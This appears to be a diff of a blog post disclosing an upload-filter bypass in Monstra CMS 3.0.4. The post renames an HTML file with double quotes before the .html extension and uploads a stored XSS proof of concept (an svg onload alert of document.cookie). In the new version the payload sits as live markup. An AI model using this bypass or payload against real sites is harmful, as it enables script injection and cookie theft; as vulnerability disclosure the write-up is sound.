@@ -88,18 +88,26 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p><strong>0x01</strong></p>
-<p><strong>In the latest version(3.0.4), the system forbids HTML suffix name upload, but now it can bypass it.</strong></p>
+        <p><strong>0x01</strong><br>I installed the latest version of monstra CMS and found upload bypass in the system<br><strong>In the latest version(3.0.4), the system forbids HTML suffix name upload, but now it can bypass it.</strong></p>
 <p><img src="https://i.loli.net/2019/10/12/8PwIjNJXZu1TULV.png" alt="图片.png"></p>
 <p><img src="https://i.loli.net/2019/10/12/FenPgaHhEcuR7xI.png" alt="图片.png"></p>
-<p><strong>0x02 **</strong>Vulnerability proof**</p>
+<p><strong>0x02</strong><br><strong>Vulnerability proof</strong></p>
 <p>You can bypass the file upload limit by putting double quotes before the suffix of HTML </p>
 <p>1  Visit website http://[address]:[port]/[app_path]/admin/index.php?id=filesmanager with login</p>
-<p>2  Save html codes with ‘.png’ extensions. and upload it like below.</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">    &lt;head&gt; </span><br><span class="line">	    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">        &lt;title&gt;hacker&lt;/title&gt; </span><br><span class="line">    &lt;/head&gt; </span><br><span class="line">    &lt;body&gt; </span><br><span class="line">     &lt;svg/onload=alert(document.cookie)&gt;</span><br><span class="line">    &lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>2  Save html codes with <div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><figcaption><span>and upload it like below.</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></p>
+<html> 
+    <head><meta name="generator" content="Hexo 3.9.0"> 
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>hacker</title> 
+    </head> 
+    <body> 
+     <svg onload="alert(document.cookie)">
+    </svg></body> 
+</html>
+```
+![图片.png](https://i.loli.net/2019/10/12/IKx9s3GArfTSLZa.png)
 
-<p><img src="https://i.loli.net/2019/10/12/IKx9s3GArfTSLZa.png" alt="图片.png"></p>
-<p>Click the uploaded file and Grab the packet and change the suffix name to XXX””.html at filename，This circumvents this limitation.</p>
+<p>Click the uploaded file and Grab the packet and change the suffix name to <code>XXX&quot;&quot;.html</code> at filename，This circumvents this limitation.</p>
 <p><img src="https://i.loli.net/2019/10/12/gK1hOqvHtEIAJNL.png" alt="图片.png"></p>
 <p><img src="https://i.loli.net/2019/10/12/tgcb9dJELnNDrx8.png" alt="图片.png"></p>
 <p>4 move to http://[address]:[port]/[app_path]/public/uploads/[uploaded file]</p>
